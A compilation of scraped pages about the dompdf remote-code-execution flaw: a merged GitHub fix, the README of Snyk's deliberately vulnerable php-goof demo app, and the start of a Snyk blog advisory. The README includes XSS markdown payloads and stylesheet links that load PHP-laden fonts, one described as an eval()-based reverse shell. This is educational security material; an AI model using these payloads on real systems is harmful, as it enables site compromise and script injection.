=== Content from github.com_77232d15_20250108_133012.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fpull%2F2808)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fpull%2F2808)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=dompdf%2Fdompdf)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dompdf](/dompdf)
/
**[dompdf](/dompdf/dompdf)**
Public

* [Notifications](/login?return_to=%2Fdompdf%2Fdompdf) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fdompdf%2Fdompdf)
* [Star
   10.6k](/login?return_to=%2Fdompdf%2Fdompdf)

* [Code](/dompdf/dompdf)
* [Issues
  536](/dompdf/dompdf/issues)
* [Pull requests
  32](/dompdf/dompdf/pulls)
* [Discussions](/dompdf/dompdf/discussions)
* [Actions](/dompdf/dompdf/actions)
* [Projects
  0](/dompdf/dompdf/projects)
* [Wiki](/dompdf/dompdf/wiki)
* [Security](/dompdf/dompdf/security)
* [Insights](/dompdf/dompdf/pulse)

Additional navigation options

* [Code](/dompdf/dompdf)
* [Issues](/dompdf/dompdf/issues)
* [Pull requests](/dompdf/dompdf/pulls)
* [Discussions](/dompdf/dompdf/discussions)
* [Actions](/dompdf/dompdf/actions)
* [Projects](/dompdf/dompdf/projects)
* [Wiki](/dompdf/dompdf/wiki)
* [Security](/dompdf/dompdf/security)
* [Insights](/dompdf/dompdf/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fdompdf%2Fdompdf%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fdompdf%2Fdompdf%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Match installed font filename extension to type #2808

 Merged

[bsweeney](/bsweeney)
merged 1 commit into
[master](/dompdf/dompdf/tree/master "dompdf/dompdf:master")
from
[persisted-font-file-extension](/dompdf/dompdf/tree/persisted-font-file-extension "dompdf/dompdf:persisted-font-file-extension")

Mar 21, 2022

 Merged

# [Match installed font filename extension to type](#top) #2808

[bsweeney](/bsweeney)
merged 1 commit into
[master](/dompdf/dompdf/tree/master "dompdf/dompdf:master")
from
[persisted-font-file-extension](/dompdf/dompdf/tree/persisted-font-file-extension "dompdf/dompdf:persisted-font-file-extension")

Mar 21, 2022

[Conversation
5](/dompdf/dompdf/pull/2808)
[Commits
1](/dompdf/dompdf/pull/2808/commits)
[Checks
0](/dompdf/dompdf/pull/2808/checks)
[Files changed](/dompdf/dompdf/pull/2808/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![bsweeney](https://avatars.githubusercontent.com/u/485897?s=60&v=4)](/bsweeney)

Copy link

Member

### @bsweeney **[bsweeney](/bsweeney)** commented [Mar 17, 2022](#issue-1171715005)

 *No description provided.*

Sorry, something went wrong.

All reactions

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)

`[Match installed font filename extension to type](/dompdf/dompdf/pull/2808/commits/00b2b360ace768d58430f1cc5a20cb43d58bbc1a "Match installed font filename extension to type

fixes #2598")`
 …

`[00b2b36](/dompdf/dompdf/pull/2808/commits/00b2b360ace768d58430f1cc5a20cb43d58bbc1a)`

```
fixes [#2598](https://github.com/dompdf/dompdf/issues/2598)
```

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
added this to the [1.2.1](/dompdf/dompdf/milestone/24) milestone
[Mar 17, 2022](#event-6254718560)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
linked an issue
[Mar 17, 2022](#event-6254720601)
that may be
closed
by this pull request

[Remote code execution vulnerability through persisted font
#2598](/dompdf/dompdf/issues/2598)

Closed

[![bsweeney](https://avatars.githubusercontent.com/u/485897?s=60&v=4)](/bsweeney)

**[bsweeney](/bsweeney)**
commented
[Mar 21, 2022](#pullrequestreview-915796427)

 [View reviewed changes](/dompdf/dompdf/pull/2808/files/00b2b360ace768d58430f1cc5a20cb43d58bbc1a)

[src/FontMetrics.php](/dompdf/dompdf/pull/2808/files/00b2b360ace768d58430f1cc5a20cb43d58bbc1a#diff-a0473fa74c65efedd487f657d52cb196245a84d2b13e622818dd0d7283da6d38)

Show resolved

Hide resolved

[![Mellthas](https://avatars.githubusercontent.com/u/5852189?s=60&v=4)](/Mellthas)

**[Mellthas](/Mellthas)**
approved these changes
[Mar 21, 2022](#pullrequestreview-916333009)

 [View reviewed changes](/dompdf/dompdf/pull/2808/files/00b2b360ace768d58430f1cc5a20cb43d58bbc1a)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
merged commit [`4c70e10`](/dompdf/dompdf/commit/4c70e1025bcd9b7694b95dd552499bd83cd6141d)
into
master

[Mar 21, 2022](https://github.com/dompdf/dompdf/pull/2808#event-6278866025)

 [![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
deleted the
persisted-font-file-extension

branch
[March 21, 2022 21:08](#event-6278866430)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fpull%2F2808)

Reviewers

[![@TimexPeachtree](https://avatars.githubusercontent.com/u/48218921?s=40&v=4)](/TimexPeachtree) [TimexPeachtree](/TimexPeachtree)

TimexPeachtree left review comments

[![@Mellthas](https://avatars.githubusercontent.com/u/5852189?s=40&v=4)](/Mellthas) [Mellthas](/Mellthas)

Mellthas approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

 [**1.2.1**](/dompdf/dompdf/milestone/24 "1.2.1")

Development

Successfully merging this pull request may close these issues.

 [Remote code execution vulnerability through persisted font](https://github.com/dompdf/dompdf/issues/2598)

3 participants

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=52&v=4)](/bsweeney) [![@Mellthas](https://avatars.githubusercontent.com/u/5852189?s=52&v=4)](/Mellthas) [![@TimexPeachtree](https://avatars.githubusercontent.com/u/48218921?s=52&v=4)](/TimexPeachtree)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_af90ac7f_20250108_133013.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsnyk-labs%2Fphp-goof)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsnyk-labs%2Fphp-goof)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=snyk-labs%2Fphp-goof)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[snyk-labs](/snyk-labs)
/
**[php-goof](/snyk-labs/php-goof)**
Public

* [Notifications](/login?return_to=%2Fsnyk-labs%2Fphp-goof) You must be signed in to change notification settings
* [Fork
  144](/login?return_to=%2Fsnyk-labs%2Fphp-goof)
* [Star
   23](/login?return_to=%2Fsnyk-labs%2Fphp-goof)

Snyk PHP Goof - A vulnerable PHP demo application

[snyk.io](https://snyk.io "https://snyk.io")

[23
stars](/snyk-labs/php-goof/stargazers) [144
forks](/snyk-labs/php-goof/forks) [Branches](/snyk-labs/php-goof/branches) [Tags](/snyk-labs/php-goof/tags) [Activity](/snyk-labs/php-goof/activity)
 [Star](/login?return_to=%2Fsnyk-labs%2Fphp-goof)

 [Notifications](/login?return_to=%2Fsnyk-labs%2Fphp-goof) You must be signed in to change notification settings

* [Code](/snyk-labs/php-goof)
* [Issues
  0](/snyk-labs/php-goof/issues)
* [Pull requests
  0](/snyk-labs/php-goof/pulls)
* [Actions](/snyk-labs/php-goof/actions)
* [Projects
  0](/snyk-labs/php-goof/projects)
* [Security](/snyk-labs/php-goof/security)
* [Insights](/snyk-labs/php-goof/pulse)

Additional navigation options

* [Code](/snyk-labs/php-goof)
* [Issues](/snyk-labs/php-goof/issues)
* [Pull requests](/snyk-labs/php-goof/pulls)
* [Actions](/snyk-labs/php-goof/actions)
* [Projects](/snyk-labs/php-goof/projects)
* [Security](/snyk-labs/php-goof/security)
* [Insights](/snyk-labs/php-goof/pulse)

# snyk-labs/php-goof

    main[Branches](/snyk-labs/php-goof/branches)[Tags](/snyk-labs/php-goof/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[56 Commits](/snyk-labs/php-goof/commits/main/) | | |
| [exploits](/snyk-labs/php-goof/tree/main/exploits "exploits") | | [exploits](/snyk-labs/php-goof/tree/main/exploits "exploits") |  |  |
| [images](/snyk-labs/php-goof/tree/main/images "images") | | [images](/snyk-labs/php-goof/tree/main/images "images") |  |  |
| [sql](/snyk-labs/php-goof/tree/main/sql "sql") | | [sql](/snyk-labs/php-goof/tree/main/sql "sql") |  |  |
| [.gitignore](/snyk-labs/php-goof/blob/main/.gitignore ".gitignore") | | [.gitignore](/snyk-labs/php-goof/blob/main/.gitignore ".gitignore") |  |  |
| [composer.json](/snyk-labs/php-goof/blob/main/composer.json "composer.json") | | [composer.json](/snyk-labs/php-goof/blob/main/composer.json "composer.json") |  |  |
| [composer.lock](/snyk-labs/php-goof/blob/main/composer.lock "composer.lock") | | [composer.lock](/snyk-labs/php-goof/blob/main/composer.lock "composer.lock") |  |  |
| [db.php](/snyk-labs/php-goof/blob/main/db.php "db.php") | | [db.php](/snyk-labs/php-goof/blob/main/db.php "db.php") |  |  |
| [func.php](/snyk-labs/php-goof/blob/main/func.php "func.php") | | [func.php](/snyk-labs/php-goof/blob/main/func.php "func.php") |  |  |
| [index.php](/snyk-labs/php-goof/blob/main/index.php "index.php") | | [index.php](/snyk-labs/php-goof/blob/main/index.php "index.php") |  |  |
| [mail.php](/snyk-labs/php-goof/blob/main/mail.php "mail.php") | | [mail.php](/snyk-labs/php-goof/blob/main/mail.php "mail.php") |  |  |
| [pdf.php](/snyk-labs/php-goof/blob/main/pdf.php "pdf.php") | | [pdf.php](/snyk-labs/php-goof/blob/main/pdf.php "pdf.php") |  |  |
| [readme.md](/snyk-labs/php-goof/blob/main/readme.md "readme.md") | | [readme.md](/snyk-labs/php-goof/blob/main/readme.md "readme.md") |  |  |
| [tasks.php](/snyk-labs/php-goof/blob/main/tasks.php "tasks.php") | | [tasks.php](/snyk-labs/php-goof/blob/main/tasks.php "tasks.php") |  |  |
| View all files | | |

## Repository files navigation

* README
# PHP Goof - Snyk's vulnerable demo php app

A vulnerable PHP demo todo application that is for demonstration and education purposes only, i take no responsibility for this being used with malicious intent nor should this be used for malicious intent (or be run in any product environment).

[![PHP Goof](/snyk-labs/php-goof/raw/main/images/screenshot.png)](/snyk-labs/php-goof/blob/main/images/screenshot.png)

## Requisites & Running

* PHP 7.4+
* Mysql or MariaDB
* Composer 2

Run composer install from the project root directory

Create mysql or mariaDB database and update the db.php file, with database details.

Import sql/database.sql file into the newly created database or run the following table create.

```
CREATE TABLE `task` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=76 DEFAULT CHARSET=utf8mb3;

```

Finally, Using the PHP built in server run the code from the root app directory

```
php -S localhost:8000

```

## Exploiting the vulnerabilities

### Commonmark XSS Vulnerability

[SNYK-PHP-LEAGUECOMMONMARK-174004](https://security.snyk.io/vuln/SNYK-PHP-LEAGUECOMMONMARK-174004)

```
* Markdown link
This is **markdown**

* Markdown link
[Snyk](https://snyk.io/)

* Failed XSS
[Gotcha](javascript:alert(1))

* Failed XSS despite URL encoding
[Gotcha](javascript&#58;alert(1&#41;)

* Successfull XSS using vuln and browser interpretation
[Gotcha](javascript&amp;colon;alert%28&#039;Gotcha&#039;%29)

```

### PHPMailer

[SNYK-PHP-PHPMAILERPHPMAILER-1311001](https://security.snyk.io/vuln/SNYK-PHP-PHPMAILERPHPMAILER-1311001)

Uses the `validateAddress()` exploit from PHPMailer 6.4.1 to execute the global `PHP()` function by default. If no argument is passed into the `validateAddress()` function, which isnt in this demo, PHPMailer sets "PHP" as the default value and runs it if its available in the scope.

To run click the email icon next to a line entry to send an email reminder.

Note: No emails will actually send or are being stored, only validating the email address entered into the input using the PHPMailer library.

### dompdf remote code execution

[SNYK-PHP-DOMPDFDOMPDF-2428942](https://security.snyk.io/vuln/SNYK-PHP-DOMPDFDOMPDF-2428942)

[Read more about this Vulnerability](https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/)

This vulnerability is using dompdf library version 1.2.0 and allows for remote code execution on the target application. In this app there is a custom font called gotcha-normal.otf which has `<?php phpinfo(); ?>` loaded into the copyright font meta.

The font file is then referenced as a `font-family` in the CSS file `gotcha.css` which is then injected into the dompdf html output via a stylesheet link.

Dompdf loads the style sheet and saves the custom font type to the dompdf font cache (and as part of the framework). This can then be remotely executed.

\*\*\* Note: in the CSS font-family, the font name needs to match the actual font name or this will not work.

To use this in this app, load the below code into a todo item and click pdf on its line entry, chicken and egg note that you will need to refresh the PDF with the file examples below so that the link generates into the pdf to click.

```
<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/gotcha.css'>

```

Additional, added an example that uses a reverse shell by using a php `eval()` in a font file leveraging the RCE exploit. This works the same as above but using the below CSS. To use it simply load any get variable into the url when the gotcha link is created in the pdf, example `...?test=phpinfo();`. Regular $\_GET references didnt work but `reset()` did which will pick up the first in the $ array and run it in `eval()`.

Note this uses a different font file and family in the exploit folder.

```
<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/rshell.css'>

```

## About

Snyk PHP Goof - A vulnerable PHP demo application

[snyk.io](https://snyk.io "https://snyk.io")

### Resources

[Readme](#readme-ov-file)

[Activity](/snyk-labs/php-goof/activity)
[Custom properties](/snyk-labs/php-goof/custom-properties)
### Stars

[**23**
stars](/snyk-labs/php-goof/stargazers)
### Watchers

[**1**
watching](/snyk-labs/php-goof/watchers)
### Forks

[**144**
forks](/snyk-labs/php-goof/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsnyk-labs%2Fphp-goof&report=snyk-labs+%28user%29)

## [Releases](/snyk-labs/php-goof/releases)

No releases published

## [Packages 0](/orgs/snyk-labs/packages?repo_name=php-goof)

No packages published

## Languages

* [PHP
  95.8%](/snyk-labs/php-goof/search?l=php)
* [CSS
  4.2%](/snyk-labs/php-goof/search?l=css)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_37de3dc4_20250108_133009.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from snyk.io_201cf3df_20250108_133014.html ===
You need to enable JavaScript to run this app.[Skip to main content](#main-content)

* Products

  Products

  + [What is Snyk?

    Developer-first security in action](/product/)
  + [Snyk Code

    Secure your code as it's written](/product/snyk-code/)
  + [Snyk Open Source

    Avoid vulnerable dependencies](/product/open-source-security-management/)
  + [Snyk Container

    Keep your base images secure](/product/container-vulnerability-management/)
  + [Snyk IaC

    Fix IaC misconfigurations in-code](/product/infrastructure-as-code-security/)
  + [Snyk AppRisk

    Reduce risk across your business](/product/snyk-apprisk/)
  + [Pricing](/plans/)

  Solutions

  + [Why Snyk?

    Modern security in a single platform](/platform/)
  + [Application security

    Build secure, stay secure](/solutions/application-security/)
  + [Software supply chain security

    Mitigate supply chain risk](/solutions/software-supply-chain-security/)
  + [Secure-AI-generated code

    AI writes, Snyk secures](/solutions/secure-ai-generated-code/)
  + [Zero-day vulnerabilities

    Fix the first day with Snyk](/solutions/zero-day-vulnerability-security/)
  + [Security Intelligence

    Comprehensive vulnerability data](/platform/security-intelligence/)

  Platform

  + [DeepCode AI

    Purpose-built security AI](/platform/deepcode-ai/)
  + [Integrations

    SDLC-spanning security](/integrations/)
  + [Code Checker

    Write better code for free](/code-checker/)

  Audience

  + [Snyk for devs

    Dev-centric info on demand](https://go.snyk.io/2024-dev-onboarding.html)
  + [Snyk for government

    Mission-informed AppSec](/government-security-solution/)
  + [Leaders handbook

    SAST essentials for genAI](/lp/securing-ai-generated-code/)![default-report.b205b2e0](https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg)

  Secure Adoption in Gen AI Era Report

  [Read report](https://go.snyk.io/secure-adoption-in-genai-era.html "Read report")
* Resources

  Our resources

  + [Resource library

    Browse our extensive database](/resource-library/)
  + [Customer resources

    The one stop shop for customers](/customer-resources/)
  + [Ethical hacking

    How ethical hacking can help you](/ethical-hacking-resources/)
  + [Security leaders

    Insights from industry leaders](/security-leaders/)
  + [Top 10 vulns

    See the most common vuln types](/snyk-top-10/)
  + [Blog Section](/blog/)
  + [Snyk's podcasts](/podcasts/the-secure-developer/)
  + [Snyk’s YouTube](https://www.youtube.com/snyksec)

  Our ecosystem

  + [Snyk Learn

    Security education from Snyk](https://learn.snyk.io)
  + [Snyk user docs

    Get started with Snyk](https://docs.snyk.io/)
  + [Snyk Support

    How can we help?](https://support.snyk.io/hc/en-us)
  + [Snyk Vuln Database

    Find new vulnerabilities](https://security.snyk.io/)
  + [Snyk Updates

    Stay in the loop](https://updates.snyk.io/)

  Our community

  + [Events & webinars](/events/)
  + [Ambassadors](/snyk-ambassadors/)
  + [Discord channel](https://snyk.co/discordcommunity)![feature-snyk-snowflake](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&w=2560&q=75)

  Extend the power of your AppSec data with the new Snyk and Snowflake integration

  [Read blog](/blog/snyk-snowflake-data-share/ "Read blog")
* Company

  Company

  ## The developer security platform

  Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

  [More about us](/about/ "More about us")
  + [Our services

    Maximize your AppSec ROI](/services/)
  + [Our customers

    We help customers save time and money](/customers/)
  + [Our partners

    Bringing business class security with partners](/partners/)
  + [Case studies

    Check out our customer stories and stats](/case-studies/)
  + [Newsroom

    See the latest press releases](/news/)
  + [Contact us

    Get in touch with any feedback or questions](/contact-us/)
  + [Careers

    Join Snyk today](/careers/)![Snyk_Probely](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&w=2560&q=75)

  Snyk Acquires Developer-First DAST Provider Probely

  [Read press release](/news/snyk-acquires-developer-first-dast-provider-probely/ "Read press release")
* [Pricing](/plans/)

ENSelect your languageEnglishDeutschFrançais日本語Português (BR)Login

Free and Team Plan Customers

* [Snyk

  app.snyk.io](https://app.snyk.io)

Enterprise Plan Customers

* [*🇺🇸*

  Snyk US - 1

  app.snyk.io](https://app.snyk.io)
* [*🇺🇸*

  Snyk US - 2

  app.us.snyk.io](https://app.us.snyk.io)
* [*🇪🇺*

  Snyk EU

  app.eu.snyk.io](https://app.eu.snyk.io)
* [*🇦🇺*

  Snyk AU

  app.au.snyk.io](https://app.au.snyk.io)

The region where your data is hosted follows local agreements, and it may not align with your own location. [Find out more](https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency).[Sign up](https://app.snyk.io/signup "Sign up")[Book a live demo](/schedule-a-demo/ "Book a live demo")[Snyk Blog](/blog/)
# dompdf security alert: RCE vulnerability found in popular PHP PDF library

Written by: ![DeveloperSteve Coochin](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2Fdeveloper-steve-coochin.jpeg&w=48&q=75)

DeveloperSteve Coochin

![wordpress-sync/blog-social-php-composer](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1621453472%2Fwordpress-sync%2Fblog-social-php-composer.png&w=2560&q=75)

March 18, 2022

 0 mins read

Recently, researchers from [Positive Security published findings](https://positive.security/blog/dompdf-rce) identifying a major [remote code execution (RCE) vulnerability in **dompdf**](https://security.snyk.io/vuln/SNYK-PHP-DOMPDFDOMPDF-2428942), a popular PDF generation library. In their reporting, they outlined a way that code could be loaded into an application and then remotely executed during a PDF being generated.

Dompdf is used quite extensively within the PHP ecosystem, and is used within over 59,000 open sourced platforms and projects. The dompdf [PHP composer page](https://packagist.org/packages/dompdf/dompdf) alone has **nearly 50 million installs** since its initial release to the PHP package manager in 2014.

At the time of writing this, there is currently no fix for this vulnerability. A potential solution could be to prohibit the loading of custom font styles into the PDF generation process or even restricting write access to the font cache folder. Alternatively, restricting access to the Composer install location is also a good option, depending on what libraries are being used and what functionality is needed in the application.

For dompdf versions => 0.8.6, the `$isRemoteEnabled` setting can be disabled to prevent loading of custom fonts through `font-face` CSS rules. However, bear in mind that this could be a breaking change. Furthermore, in versions <0.8.5, this setting is not used and as such this vulnerability cannot be patched through the `$isRemoteEnabled` setting.

In this blog post, we’ll take a look at how the vulnerability works. One thing I find helpful for fundamentally understanding code and vulnerabilities at a more granular level is to get hands-on. So in this blog post we’re going to explore this vulnerability through a working demo using the [php-goof](https://github.com/snyk-labs/php-goof) application on a Snyk GitHub repo.

## PDF libraries

PDF generation within applications is one of my least favorite tasks as a developer. It's a fairly lengthy reiterative process involving code change, generate, code change, generate, etc. to get the formatting and layout right within the PDF being created.

But being able to format HTML to PDF is amazingly useful, especially when you think about how often applications need to use PDF generation. You use them almost every day, on ecommerce websites or sites where you have user-based transactional data that needs to have a receipt generated for the user to save or print.

